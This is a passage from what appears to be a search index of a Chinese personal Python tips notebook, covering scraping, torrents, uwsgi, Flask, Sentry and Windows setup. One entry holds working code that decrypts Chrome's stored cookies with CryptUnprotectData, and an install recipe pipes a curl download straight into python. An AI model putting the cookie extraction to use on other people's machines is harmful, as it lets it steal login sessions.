headless\u722c\u590d\u6742\u7f51\u9875","text":"<p>\u4f8b\u5b50\uff1a\u963f\u91cc\u4e91\u6240\u6709\u57df\u540d\u4ef7\u683c\u9875\u9762 https://wanwang.aliyun.com/help/price.html</p> <p>\u4ece\u7f51\u7edc\u8bf7\u6c42\u770b\u51fa\u5176\u4ef7\u683c\u63a5\u53e3\u6709\u591a\u4e2a\uff0c\u800c\u4e14\u8f83\u4e3a\u590d\u6742\uff1b\u90a3\u5c31\u4e0d\u59a8\u8bd5\u8bd5\u7528selenium\u8ba9chrome headless\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\uff0c\u52a0\u8f7d\u6e32\u67d3\u5b8c\u6210\u540e\u6211\u4eec\u518d\u83b7\u53d6\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u6b64\u65f6\u6e90\u4ee3\u7801\u91cc\u9762\u5c31\u6709\u4e86\u5b8c\u6574\u7684\u4ef7\u683c\u6570\u636e</p> <p>\u8fd0\u884c\u73af\u5883\uff1a\u53ea\u9700\u8981Docker\u548cPython3\uff0c\u65e0\u9700\u684c\u9762\u73af\u5883</p> <p>\u955c\u50cf\u53c2\u8003\uff1ahttps://hub.docker.com/r/selenium/standalone-chrome/</p> <p>\u5148\u8dd1\u8d77\u6765\u5bb9\u5668\u5457\uff0c\u8fd9\u6837\u5c31\u8fd0\u884c\u4e86selenium server\uff0c\u4e3b\u673a\u66b4\u9732\u4e86\u4e00\u4e2a6666\u7aef\u53e3\uff0c\uff1a</p> <pre><code>docker run -d -p 6666:4444 -v /dev/shm:/dev/shm selenium/standalone-chrome\n</code></pre> <p>\u5b89\u88c5Python\u5305\uff1a<code>pip3 install selenium</code></p> <p>\u8c03\u7528\u4ee3\u7801\uff0c\u722c\u53d6url\uff0c\u5f97\u5230\u7f51\u9875\u6e90\u4ee3\u7801\uff0c\u5176\u4e2d127.0.0.1\u76f8\u5e94\u5730\u4fee\u6539\u4e3aDocker\u4e3b\u673a\u7684IP:</p> <pre><code>url = \"https://wanwang.aliyun.com/help/price.html\"\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.desired_capabilities import DesiredCapabilities\ndriver = webdriver.Remote(\n    command_executor='http://127.0.0.1:6666/wd/hub',\n    desired_capabilities=DesiredCapabilities.CHROME)\ndriver.get(url)\nhtml = driver.page_source\nwith open(\"result.html\", \"w\", encoding=\"utf-8\") as fp:\n        fp.write(html)\ndriver.quit() #\u4e00\u5b9a\u8981\u8bb0\u5f97\u6e05\u7406\u6389Chrome\u8fdb\u7a0b \u5426\u5219\u5185\u5b58\u4f1a\u5360\u6ee1\n</code></pre> <p>\u5982\u679c\u6ca1\u6709\u5728\u4ee3\u7801\u91cc\u9762\u6e05\u7406Chrome\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u91cc\u9762\u8fdb\u5165Console\uff0c\u5728\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u5f53\u524d\u8fd0\u884c\u7684Session (Chrome\u8fdb\u7a0b) \uff0c\u5bf9\u5f53\u524d\u9875\u9762\u67e5\u770b\u9875\u9762\u622a\u56fe\uff1a http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>"},{"location":"Python/#pythonroot","title":"python\u4e22\u5f03root\u6743\u9650","text":"<p>\u5982\u679cpython\u9700\u8981\u76d1\u542c80\u7aef\u53e3\uff0c\u7b80\u5355\u65b9\u5f0f\u5c31\u662f\u76f4\u63a5\u7528root\u6743\u9650\u542f\u52a8\uff0c\u4f46\u542f\u52a8\u540e\u53ef\u4ee5\u4e22\u5f03root\u6743\u9650\u6765\u63d0\u9ad8\u5b89\u5168\u6027</p> <p>code from https://stackoverflow.com/questions/2699907/dropping-root-permissions-in-python</p> <pre><code>import os, pwd, grp\n\ndef drop_privileges(uid_name='nobody', gid_name='nogroup'):\n    if os.getuid() != 0:\n        # We're not root so, like, whatever dude\n        return\n\n    # Get the uid/gid from the name\n    running_uid = pwd.getpwnam(uid_name).pw_uid\n    running_gid = grp.getgrnam(gid_name).gr_gid\n\n    # Remove group privileges\n    os.setgroups([])\n\n    # Try setting the new uid/gid\n    os.setgid(running_gid)\n    os.setuid(running_uid)\n</code></pre>"},{"location":"Python/#python-transmissionrpc","title":"python transmissionrpc","text":"<p>\u4e0b\u8ff0\u4e3b\u8981\u4ecb\u7ecdtransmissionrpc\u8fd9\u4e2a\u5e93\u7684\u4f7f\u7528</p>"},{"location":"Python/#_14","title":"\u4e0a\u4f20\u4e00\u4e2a\u79cd\u5b50 \u5f00\u59cb\u4e0b\u8f7d","text":"<p>\u4f7f\u7528Client\u7684add_torrent\u65b9\u6cd5\uff0c\u4f20\u5165\u79cd\u5b50\u6587\u4ef6\u7684base64</p> <pre><code>def upload_transmission(thost, tport, tuser, tpassword, filename):\ntc = transmissionrpc.Client(thost, port=tport, user=tuser, password=tpassword)\nreturn tc.add_torrent(base64.b64encode(open(filename, \"rb\").read()).decode())\n</code></pre> <p>\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u4e0d\u5b8c\u6574\u7684torrent\u5bf9\u8c61</p>"},{"location":"Python/#torrent","title":"\u83b7\u53d6\u5b8c\u6574\u7684torrent\u5bf9\u8c61","text":"<pre><code>torrent_id = torrent.id\nfull_torrent = tc.get_torrent(torrent_id)\n</code></pre> <p>\u5176\u4e2d\u5c31\u6709\u72b6\u6001\u548c\u8fdb\u5ea6\u4fe1\u606f</p> <pre><code>print(full_torrent.status, full_torrent.progress)\n</code></pre>"},{"location":"Python/#tracker","title":"\u7ed9\u79cd\u5b50\u589e\u52a0\u4e00\u4e2atracker","text":"<p>\u8fd9\u6837\u53ef\u4ee5\u628apt\u7ad9\u70b9\u7684\u79cd\u5b50\u8f6c\u5230OpenTracker\uff0c\u65e0\u9700\u91cd\u65b0\u6821\u9a8c\u79cd\u5b50\uff08\u4f46\u4f20\u5230\u65b0\u7684pt\u7ad9\u70b9infohash\u4f1a\u53d8\uff0c\u53ea\u80fd\u4f20\u65b0\u79cd\u5b50\u91cd\u65b0\u6821\u9a8c\uff09</p> <p>transmissionrpc\u672c\u8eab\u4f3c\u4e4e\u6ca1\u6709\u66b4\u9732\u51fatrackerAdd\u7684\u65b9\u6cd5\uff0c\u8fd9\u662f\u7ed3\u5408\u6d4f\u89c8\u5668\u548c\u7ffb\u9605\u4ee3\u7801\u81ea\u5df1\u8bd5\u51fa\u6765\u7684</p> <pre><code>torrent._client._request('torrent-set', {\"trackerAdd\": [new_tracker_url]}, torrent.id, True)\n</code></pre>"},{"location":"Python/#torrenttracker","title":"\u4fee\u6539\u4e00\u4e2a.torrent\u6587\u4ef6\u7684tracker","text":"<p>\u4f7f\u7528torf\u5e93\uff0c\u8fd9\u4e2a\u5e93\u4f7f\u7528\u4e86python3.6\u624d\u652f\u6301\u7684\u7279\u6027\uff0c\u4f9d\u8d56\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001dict\u904d\u5386\u7684\u6709\u5e8f\u6027</p> <p>\u6211\u4fee\u6539\u540e\u7684\u7248\u672c\u4e0b\u8f7d\uff0c\u652f\u6301py3.5\uff1ahttps://d.py3.io/torf.zip</p> <p>\u4ee3\u7801\uff1a</p> <pre><code>t=torf.Torrent.read(torrent_filename)\nt.trackers=[[new_tracker_url]]\nt.write(\"new.torrent\")\n</code></pre>"},{"location":"Python/#uwsgi","title":"uwsgi\u4f18\u96c5\u91cd\u542f","text":"<p>\u53c2\u8003\uff1ahttp://uwsgi-docs.readthedocs.io/en/latest/articles/TheArtOfGracefulReloading.html</p> <p>\u5728uwsgi.ini\u4e2d\u6dfb\u52a0\u4e00\u884c\uff1a</p> <pre><code>master-fifo = /tmp/uwsgififo\n</code></pre> <p>\u9700\u8981\u91cd\u542f\u7684\u65f6\u5019\u5c31\uff1a</p> <pre><code>echo r&gt;/tmp/uwsgififo\n</code></pre> <p>\u6587\u4ef6\u6253\u5f00\u65b9\u5f0f\u5fc5\u987b\u662f\u201dw\u201d\u800c\u4e0d\u80fd\u662f\u201da\u201d\uff1a</p> <pre><code>open(\"/tmp/uwsgififo\", \"w\").write(\"r\")\n</code></pre>"},{"location":"Python/#flask","title":"flask\u8bbe\u7f6e\u4e00\u5806\u9759\u6001\u76ee\u5f55","text":"<pre><code>from flask import Flask, render_template, Blueprint, request, redirect, Markup\napp = Flask(__name__)\nfor path in ['pic', 'skin', 'images', '\u66f4\u591a\u9759\u6001\u76ee\u5f55']:\n    blueprint = Blueprint(path, __name__, static_url_path='/'+path, static_folder=path)\n    app.register_blueprint(blueprint)\n</code></pre>"},{"location":"Python/#python35-openutf-8","title":"Python3.5 open\u6253\u5f00\u6587\u4ef6\u9ed8\u8ba4\u4f7f\u7528utf-8","text":"<p>Windows\u4e0bopen\u6253\u5f00\u6587\u4ef6\u603b\u662f\u4f1a\u4f7f\u7528gbk\uff0c\u914d\u7f6e\u73af\u5883\u53d8\u91cf\u5982PYTHONIOENCODING\u90fd\u6ca1\u7528\uff0c\u5c31\u5f88\u6c14\uff0c\u96be\u9053\u53ea\u80fd\u6bcf\u6b21open\u90fd\u4fdd\u8bc1\u5199\u4e0aencoding=\u201dutf-8\u201d\u561b\uff1f\u5f53\u7136\u4e0d\u5fc5</p> <p>google\u641c\u7d22\u5173\u952e\u8bcd\uff1awindows python3 change open file encoding</p> <p>\u89e3\u51b3\u65b9\u6848\uff1a\u53c2\u8003\uff1ahttps://stackoverflow.com/questions/31469707/changing-the-locale-preferred-encoding-in-python-3-in-windows</p> <p>\u6dfb\u52a0\u4ee3\u7801\uff1a\u7531\u4e8e\u53ea\u6709windows\u624d\u9700\u8981\u8fd9\u4e48\u5904\u7406\uff0c\u6240\u4ee5\u5148\u5224\u65ad\u64cd\u4f5c\u7cfb\u7edf</p> <pre><code>import sys\nif sys.platform.startswith(\"win\"):\n    import _locale\n    _locale._getdefaultlocale = (lambda *args: ['en_US', 'utf8'])\n</code></pre>"},{"location":"Python/#pythonurl","title":"Python\u63d0\u53d6url \u6b63\u5219\u5339\u914d\u7684\u56de\u6eaf\u7206\u70b8\u95ee\u9898","text":"<p>\u63d0\u53d6url\u60f3\u9047\u5230\u4e2d\u6587\u5b57\u7b26\u5c31\u4e0d\u7b97\u5165url\u4e2d\uff0c\u5199\u51fa\u4e86\u8fd9\u6837\u7684\u6b63\u5219(Python)\uff0c\u628a\u4e2d\u6587\u52a0\u5165\u5230\u6700\u540e\u7684\u6392\u9664\u5b57\u7b26\uff1a</p> <pre><code>_url_re = re.compile(r'(?im)((?:https?://|www\\d{0,3}[.]|[a-z0-9.\\-]+[.][a-z]{2,4}/)(?:[^\\s()&lt;&gt;\uff0c\u3002\uff08\uff09]+|\\([^\\s()&lt;&gt;\uff0c\u3002\uff08\uff09]+\\))+(?:\\([^\\s()&lt;&gt;\uff0c\u3002\uff08\uff09]+\\)|[^\\u4e00-\\u9fa5\uff0c\u3002\uff08\uff09\\s`!()\\[\\]{};:\\'\".,&lt;&gt;?]))')\n</code></pre> <p>\u7136\u540e\u5b9e\u9645\u8fd0\u884c\u7684\u65f6\u5019\u53d1\u73b0\u7f51\u7ad9\u7279\u5b9a\u9875\u9762\u8bbf\u95ee\u7279\u522b\u7f13\u6162\uff0cCPU\u5360\u7528\u9ad8\uff0c\u6392\u9664\u8bb8\u4e45\u6b7b\u5faa\u73af\u540e\u53d1\u73b0\u662f\u8fd9\u4e2a\u6b63\u5219\u82b1\u4e86\u592a\u957f\u7684\u65f6\u95f4</p> <p>\u89e3\u51b3\u65b9\u6848\u5c31\u662f\u653e\u5f03\u4f7f\u7528\u6b63\u5219\u6765\u5254\u9664\u4e2d\u6587\uff0c\u63d0\u53d6\u51fa\u542b\u6709\u4e2d\u6587\u5b57\u7b26\u7684url\u540e\u518d\u505a\u5904\u7406\u53bb\u6389\u4e2d\u6587\u5b57\u7b26\uff08\u5b57\u8282\u6570&gt;1\u7684\uff09</p> <p>\u73b0\u5728\u4f7f\u7528\u7684\u6b63\u5219\u662f\uff1a</p> <pre><code>_url_re = re.compile(r'(?im)((?:https?://|www\\d{0,3}[.]|[a-z0-9.\\-]+[.][a-z]{2,4}/)(?:[^\\s()&lt;&gt;]+|\\([^\\s()&lt;&gt;]+\\))+(?:\\([^\\s()&lt;&gt;]+\\)|[^\\s`!()\\[\\]{};:\\'\".,&lt;&gt;?]))')\n</code></pre> <p>\u63d0\u53d6\u540e\u7684\u5904\u7406\u4ee3\u7801\uff1a</p> <pre><code>start, end = match.span()\nwhile len(data[end-1].encode(\"utf-8\"))&gt;1:\n    end -= 1\n</code></pre> <p>\u73b0\u5728\u6539\u4e3a\u66f4\u52a0\u4fdd\u5b88\u7684 \u4ece\u5de6\u5f80\u53f3\u904d\u5386\uff0c\u9047\u5230\u5b57\u8282\u6570&gt;1\u7684\u5c31\u7ec8\u6b62url\uff1a</p> <pre><code>start, end = match.span()\nnewend = start\nwhile newend&lt;end and len(data[newend].encode(\"utf-8\"))==1:\nnewend += 1\nend = newend\n</code></pre>"},{"location":"Python/#ubuntugmpy2","title":"ubuntu\u5b89\u88c5gmpy2","text":"<pre><code>apt install libmpc-dev libmpfr-dev\npip install gmpy2\n</code></pre> <p>\u8fa3\u9e21\u7684\u5b98\u65b9\u6587\u6863\u90fd\u4e0d\u63d0\u4e00\u4e0bapt\u5b89\u88c5\u4f9d\u8d56\u5e93\u7684\u4e8b\u60c5\uff0capt\u80fd\u641e\u5b9a\u7684\u4e3a\u5565\u8fd8\u8981\u81ea\u5df1\u7f16\u8bd1hhh</p> <p>\u652f\u6301python3 \u4e5f\u53ef\u4ee5-t .\u5b89\u88c5\u5230\u5f53\u524d\u76ee\u5f55\uff0c\u5c31\u662f\u7f16\u8bd1\u751f\u6210\u4e86\u4e00\u4e2aso\u6587\u4ef6</p>"},{"location":"Python/#flask_1","title":"Flask\u6a21\u677f \u5220\u53bb\u5faa\u73af\u5f15\u5165\u7684\u591a\u4f59\u7a7a\u683c","text":"<p>\u5728\u6a21\u677f\u6587\u4ef6\u4e2d\u5199for\u5faa\u73af\u7684\u65f6\u5019\uff0c\u4ea7\u751f\u7684html\u4f1a\u5305\u542b\u4ee3\u7801\u4e2d\u7684\u7f29\u8fdb\u7a7a\u683c\uff0c\u8fd9\u53ef\u80fd\u4f1a\u66b4\u9732\u4ee3\u7801\u7684\u4fe1\u606f\uff0c\u6240\u4ee5\u6709\u5fc5\u8981\u5220\u53bb</p> <p>\u5f88\u7b80\u5355 \u628a <code>{% %}</code>\u6539\u4e3a <code>{%- -%}</code>\u5373\u53ef</p> <pre><code>{%- for i in range(1,10) -%}\n{{i}}\n{%- endfor -%}\n</code></pre>"},{"location":"Python/#sentry","title":"\u4f7f\u7528sentry","text":"<p>\u5728py\u6587\u4ef6\u4e00\u5f00\u59cb\u8fdb\u884c\u52a0\u8f7d\uff0c\u4f1a\u81ea\u52a8\u5904\u7406\u6ca1\u6709\u88abhandle\u7684\u5f02\u5e38</p> <p>\u5b89\u88c5\uff1apip install sentry_sdk</p> <pre><code>import sentry_sdk\nfrom sentry_sdk import capture_message, capture_exception\nsentry_sdk.init(\"....\")\n</code></pre> <p>\u5728\u51fa\u73b0\u4e86\u610f\u5916\u4f46\u662f\u4e0d\u4e25\u91cd\u53ef\u4ee5pass\u7684\u65f6\u5019 \u4ee3\u66ff<code>traceback.print_exc()</code>\uff1a</p> <pre><code>try:\n1/0\nexcept:\ncapture_exception()\ncapture_message(\"oho, 1/0 failed...\")\npass\n</code></pre> <p>\u5982\u679c\u662fflask\u7684\u5e94\u7528 \u6bd4\u5982\u7528\u6237\u767b\u5f55\u4e86\uff0c\u5e0c\u671b\u62a5\u9519\u7684\u65f6\u5019\u987a\u5e26\u7ed9\u51fa\u7528\u6237\u540d\uff1a</p> <pre><code>from sentry_sdk import configure_scope\n@app.before_request\ndef before_request_session():\n    if \"username\" in session:\n        with configure_scope() as scope:\n            scope.user = {\"username\": session[\"username\"]}\n</code></pre>"},{"location":"Python/#sentry_1","title":"\u4e0d\u8981\u8fc7\u4e8e\u4f9d\u8d56Sentry","text":"<p><code>capture_exception</code>\u548c<code>capture_message</code> \u90fd\u662f\u540c\u6b65\u8c03\u7528 \u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u8017\u65f6\u7684\u7f51\u7edc\u8bf7\u6c42</p> <p>\u5c24\u5176\u5728\u5faa\u73af\u4e2d\u89e6\u53d1 \u4f1a\u5bfc\u81f4\u9875\u9762\u52a0\u8f7d\u901f\u5ea6\u663e\u8457\u53d8\u6162</p> <p>\u5bf9\u4e8e\u5df2\u7ecf\u77e5\u9053\u4f1a\u6709\u5f02\u5e38\u4ea7\u751f\u4e5f\u4e0d\u5173\u5fc3\u7684\uff0c\u5c31\u4e0d\u8981\u6293\u4f4f\u8fd9\u79cd\u5f02\u5e38\u6765\u635f\u5bb3\u6027\u80fd\u4e86 pass\u5c31\u597d\u4e86</p>"},{"location":"Python/#pysysargv","title":"\u89e3\u51b3\u547d\u4ee4\u884c\u6267\u884cpy\u6587\u4ef6\u6ca1\u6709sys.argv\u7684\u95ee\u9898","text":"<p>\u8fd9\u662f\u7531\u4e8e\u6253\u5f00\u65b9\u5f0f\u6ca1\u6709\u628a%*\u52a0\u4e0a\u7684\u539f\u56e0\uff0c\u4fee\u6539\u6ce8\u518c\u8868 regedit</p> <pre><code>HKEY_CLASSES_ROOT\\Python.File\\Shell\\open\\command\n</code></pre> <p>\u672b\u5c3e\u52a0\u4e0a<code>%*</code>\u5373\u53ef\uff0c\u4f8b\u5982\u6539\u4e3a</p> <pre><code>\"C:\\Python37\\python.exe\" \"%1\" %*\n</code></pre> <p>\u4f60\u4e5f\u53ef\u4ee5\u7528\u7ba1\u7406\u5458\u6743\u9650\u7684cmd\u6765\u505a\u4fee\u6539\uff1a</p> <p>\u5148\u67e5\u8be2.py\u7684\u6587\u4ef6\u7c7b\u578b\uff1a<code>assoc .py</code>\u67e5\u5230<code>.py=Python.File</code></p> <p>\u7136\u540e\u67e5\u4e00\u4e0b\u5f53\u524d\u7684\u8fd0\u884c\u547d\u4ee4\uff1a<code>ftype Python.File</code> \u7136\u540e\u7528<code>ftype Python.File=\"C:\\Python37\\python.exe\" \"%1\" %*</code>\u4fee\u6539\u5373\u53ef</p>"},{"location":"Python/#pythonwindows-chromecookie","title":"Python\u83b7\u53d6Windows Chrome\u7684Cookie","text":"<p>\u53c2\u8003\uff1ahttps://github.com/cheezone/ZhihuVAPI/blob/34ef5881f83da0026119e3167ebe727619774c7b/ZhihuVAPI/util/Session.py#L18</p> <p>Chrome\u7684cookie\u7528sqlite\u6570\u636e\u5e93\u5b58\u50a8\uff0c\u7528WinAPI\u52a0\u5bc6\uff0c\u5f53\u524d\u7528\u6237\u4efb\u4f55\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u8c03\u7528\u89e3\u5bc6API\u6765\u83b7\u53d6cookie</p> <pre><code>import sqlite3\nimport glob\nimport os\nfrom win32.win32crypt import CryptUnprotectData\n\ndef getcookie(host):\n    result = []\n    for cookiepath in glob.glob(os.environ['LOCALAPPDATA'] + r\"\\*\\*\\User Data\\Default\\Cookies\")+glob.glob(os.environ['LOCALAPPDATA'] + r\"\\*\\User Data\\Default\\Cookies\"):\n        sql = \"select host_key,name,encrypted_value from cookies where host_key='%s'\" % host\n        with sqlite3.connect(cookiepath) as conn:\n            cu = conn.cursor()\n            cookies = {name: CryptUnprotectData(encrypted_value)[1].decode() for host_key, name, encrypted_value in cu.execute(sql).fetchall()}\n        result.extend([k+\"=\"+v for k, v in cookies.items()])\n    return result\n</code></pre> <p>\u8c03\u7528\u5982<code>getcookie(\".zhihu.com\")</code></p>"},{"location":"Python/#winencodingutf-8","title":"Win\u5f00\u53d1\u6446\u8131\u6bcf\u6b21\u90fd\u8981\u5199\u7684encoding=utf-8","text":"<p>\u5728Windows\u4e0a\u5199\u4ee3\u7801\uff0c\u76ee\u6807\u90e8\u7f72\u73af\u5883\u4e3alinux\uff0c\u672c\u673a\u8fd0\u884c\u7684\u65f6\u5019\u4e0d\u60f3\u6bcf\u6b21\u8bfb\u5199\u6587\u4ef6\u90fd\u8981\u5199<code>encoding=\"utf-8\"</code></p> <p>\u4fee\u6539<code>C:\\Python38\\Lib\\site.py</code>\uff0c\u672b\u5c3e\u52a0\u4e0a\uff1a</p> <pre><code>import _locale\n_locale._getdefaultlocale = (lambda *args: ['en_US', 'utf8'])\n</code></pre> <p>\u9a8c\u8bc1\u53ef\u4ee5\u7528\uff1a<code>python -c \"print(open('x','w').encoding)\"</code> \u8f93\u51fa<code>utf8</code>\u800c\u4e0d\u662f<code>cp936</code>\u5373\u53ef</p> <p>\u53c2\u8003\uff1a https://juejin.im/post/5bd2b6d5e51d45735c3c0453</p>"},{"location":"Python/#ubuntu1604python37","title":"Ubuntu16.04\u5b89\u88c5Python3.7","text":"<p>\u5e76\u4e14\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u7684python</p> <pre><code>    apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA6932366A755776 &amp;&amp;\\\n    echo \"deb http://ppa.launchpad.net/deadsnakes/ppa/ubuntu xenial main\" &gt; /etc/apt/sources.list.d/python.list &amp;&amp;\\\n    apt update &amp;&amp; apt install -y python3.7-dev &amp;&amp;\\\n    update-alternatives --install /usr/bin/python python /usr/bin/python3.7 50 &amp;&amp;\\\n    curl https://bootstrap.pypa.io/get-pip.py | python &amp;&amp;\\\n    pip install -U setuptools\n</code></pre> <p>\u4f46\u662f\u5728ubuntu 14.04\u4e0a\u4ece\u8fd9\u4e2appa\u6e90\u5b89\u88c5\u7684python\u6ca1\u6709_ssl\u7684\u5e93\uff0c\u65e0\u6cd5\u4f7f\u7528pip\u5f88\u8ff7\uff08\u89e3\u51b3\u65b9\u6848\u5c31\u662f\u5f00\u4e86\u4e00\u4e2adocker ubuntu16.04\u7684\u5bb9\u5668\u7ee7\u7eed\uff09</p>"},{"location":"Python/#keyboardinterrupt","title":"\u5224\u65ad\u4ee3\u7801\u662f\u5426\u5361\u4f4f\uff0c\u81ea\u52a8\u53d1\u9001KeyboardInterrupt","text":"<p>\u573a\u666f\uff1a \u8dd1\u722c\u866b\u7b49\u4f9d\u8d56\u7f51\u7edc\u7684\u4ee3\u7801\uff0c\u9047\u5230\u7f51\u7edc\u4e0d\u4f73\u7684\u65f6\u5019\u4e00\u76f4\u5361\u4f4f\u4e0d\u518d\u6267\u884c\uff0c\u589e\u52a0timeout\u8bbe\u7f6e\u786e\u5b9e\u662f\u4e00\u79cd\u65b9\u6cd5\uff0c\u6709\u6ca1\u6709\u4e0d\u7528\u6539\u4ee3\u7801\u7684\u65b9\u5f0f\u5462\uff1f</p> <p>\u4f9d\u8d56\uff1a <code>apt install inotify-tools</code></p> <p>watch.sh:</p> <pre><code>#!/bin/bash\nwhile true; do\ninotifywait -e modify -t 100 $1\nres=$?\nif [ \"$res\" == \"2\" ]; then\necho \"[`date`] Time Out!\"\n$2 || break\nfi\nsleep 60\ndone\n</code></pre> <p>\u7528\u6cd5\uff1a</p> <pre><code>python -u run.py &gt;&amp; log.txt &amp;\nps #\u67e5\u770bpython\u8fdb\u7a0b\u7684id, \u5047\u8bbe\u4e3a12345\n./watch.sh log.txt \"kill -SIGINT 12345\"\n</code></pre> <p>\u89e3\u91ca\uff1apython\u6307\u5b9a\u8f93\u51fa\u6d41\u4e0d\u7f13\u5b58\uff0c\u4fdd\u8bc1\u6700\u65b0\u7684print\u4e5f\u80fd\u5b9e\u65f6\u5199\u5165\u6587\u4ef6\u4e2d</p> <p>\u7136\u540e\u4f7f\u7528inotifywait\u8fd9\u4e2a\u5de5\u5177\u89c2\u5bdf\u6587\u4ef6<code>$1</code>\u5728100\u79d2\u5185\u6709\u6ca1\u6709\u53d1\u751f\u4fee\u6539</p> <p>\u5982\u679c\u6ca1\u6709\u4fee\u6539\u5c31\u6267\u884c\u7528\u6237\u63d0\u4f9b\u7684\u53c2\u6570<code>$2</code>\uff0c\u8fd9\u91cc\u662f\u4f7f\u7528kill\u53d1\u9001SIGINT\u4fe1\u53f7</p> <p>\u5728Linux\u91cc\uff0c\u7528\u6237\u6309Ctrl+C\u5c31\u662fBASH\u7ed9\u5f53\u524d\u524d\u53f0\u7684\u8fdb\u7a0b\u53d1\u9001\u8fd9\u4e2a\u4fe1\u53f7</p> <p>\u5982\u679c\u8fdb\u7a0b\u5df2\u7ecf\u7ed3\u675f\uff0c\u90a3\u4e48kill\u4f1a\u62a5\u9519\u627e\u4e0d\u5230\u8fdb\u7a0b\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5break\u8df3\u51fa\u5faa\u73af\u4e86</p> <p>\u5982\u679c\u53d1\u751f\u4e86\u4fee\u6539\u5c31\u6b47\u4e00\u5206\u949f\u540e\u7ee7\u7eed\u89c2\u5bdf</p> <p>\u8fd9\u4e2a\u573a\u666f\u4e0b\u5141\u8bb8\u5ef6\u8fdf\u6ca1\u5fc5\u8981\u4e00\u76f4\u89c2\u5bdf\uff0c\u53ea\u8981\u5361\u4f4f\u7684\u65f6\u5019\u80fd\u53d1\u73b0\u5373\u53ef\uff08\u6700\u8fdf160\u79d2\uff09</p> <p>\u5f53\u7136\u722c\u866b\u4ee3\u7801\u9700\u8981\u5904\u7406\u5f02\u5e38\uff0c\u5931\u8d25\u7684\u65f6\u5019\u7ee7\u7eed\u4e0b\u4e00\u6b21\u722c\u53d6\u6216\u8005\u91cd\u8bd5\u5373\u53ef</p>"},{"location":"Python/#pythonstartup-pythonimport","title":"\u8bbe\u7f6ePYTHONSTARTUP\u73af\u5883\u53d8\u91cf \u542f\u52a8Python\u81ea\u52a8\u6267\u884c\u4e00\u4e9bimport","text":"<p>\u7ecf\u5e38\u542f\u52a8Python\u5f53\u8ba1\u7b97\u5668\u7528\uff0c\u4f46\u6709\u4e9b\u65f6\u5019\u4e5f\u9700\u8981\u6267\u884cquote\u4e4b\u7c7b\u7684\u51fd\u6570\uff0c\u6bcf\u6b21\u90fd\u8981\u624b\u52a8import\u5c31\u5f88\u70e6</p> <p>\u6240\u4ee5\u53ef\u4ee5\u914d\u7f6e\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u6765\u8ba9\u542f\u52a8Python\u65f6\u81ea\u52a8\u6267\u884c\u8fd9\u4e9bimport\u64cd\u4f5c</p> <p>Note</p> <p>\u6ce8\u610f\u8fd9\u4e2a\u4e0d\u4f1a\u6539\u53d8Python\u6267\u884c.py\u6587\u4ef6\u7684\u884c\u4e3a\uff0c\u53ea\u5728Python Interpreter\u4e2d\u751f\u6548</p> <p>Windows\u5728cmd\u91cc\u53ef\u4ee5\u7528setx\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u6216\u8005\u4f60\u4e5f\u53ef\u4ee5\u7f16\u8f91\u6ce8\u518c\u8868 <code>HKEY_CURRENT_USER\\Environment</code></p> <p>\u53c2\u8003\uff1a http://www.dowdandassociates.com/blog/content/howto-set-an-environment-variable-in-windows-command-line-and-registry/</p> <pre><code>setx PYTHONSTARTUP d:\\myshell\\pyload.py\n</code></pre> <p>\u8fd9\u4e2a\u811a\u672c\u9700\u8981\u5feb\u901f\u52a0\u8f7d\uff0c\u907f\u514d\u542f\u52a8Python\u592a\u6162\uff0c\u6240\u4ee5\u4f7f\u7528lazyload\u6765\u628a\u771f\u6b63\u7684import\u7559\u5230\u4f7f\u7528\u65f6\uff1a</p> <p>\u4f9d\u8d56\uff1a PYTHONUTF8=1\u4f7f\u5f97windows\u7684python\u8bfb\u5199\u6587\u4ef6\u9ed8\u8ba4\u4e5f\u4f7f\u7528UTF8</p> <pre><code>set PYTHONUTF8=1\npip install lazy_import\n</code></pre> <p>\u5148\u7b80\u8981\u6982\u62ec\u4e00\u4e0b\u8fd9\u4e2a\u811a\u672c\u63d0\u4f9b\u4e86\u4e9b\u5565\uff1a</p> <pre><code>\u6807\u51c6\u5e93\uff1atime, sys, os, json, pickle, csv, requests, np(numpy), plt(matplotlib.pyplot)\n\u5bf9\u8c61\uff1aa\u662fEasyLogin(), sess\u662frequests.session()\n\u51fd\u6570\uff1a pload(filename, default) \u8f7d\u5165\u4e00\u4e2apickle\u6587\u4ef6\npdump(filename, data) \u5c06data\u5199\u5165pickle\u6587\u4ef6\njload \u7528json\u8bfb\u53d6\u6587\u4ef6\njload \u7528json\u5199\u5165\u6587\u4ef6\nbd(b64_string) \u89e3\u7801base64\u5b57\u7b26\u4e32\uff0c\u8fd4\u56destr\uff0c\u81ea\u52a8\u8865\u9f50\u7b49\u53f7\uff0c\u4e0d\u4f1aInvalid base64-encoded string\nhd(b16_string) hex decode \u5c06hex\u5b57\u7b26\u4e32\u8f6c\u4e3abytes\nmyprint \u663e\u793a\u5f53\u524d\u65f6\u95f4\u7684print\nmd5 \u8ba1\u7b97\u7ed9\u5b9a\u5b57\u7b26\u4e32\u7684md5\u768432\u5b57\u8282hex\u5b57\u7b26\u4e32\nt() int(time.time())\nd() \u7b49\u4ef7\u4e8edate -d@xxx\uff0c\u5c06timestamp\u8f6c\u4e3a\u4eba\u7c7b\u53ef\u8bfb\u7684\u683c\u5f0f\uff0c\u4e5f\u652f\u6301\u6beb\u79d2\u7684\u8f93\u5165\n\u7b80\u5199\uff1a\njl = json.loads\npp = pprint.pprint\nsleep = time.sleep\nleval = ast.literal_eval\n</code></pre> <pre><code>import _locale\n_locale._getdefaultlocale = (lambda *args: ['en_US', 'utf8'])\nimport time\nfrom time import sleep\nimport sys\nimport json\nimport pickle\n\ndef pload(filename, default=None, lib=pickle):\n    try:\n        res = lib.load(open(filename, \"rb\"))\n    except:\n        if default is None:\n            raise\n        return default\n    return res\n\ndef 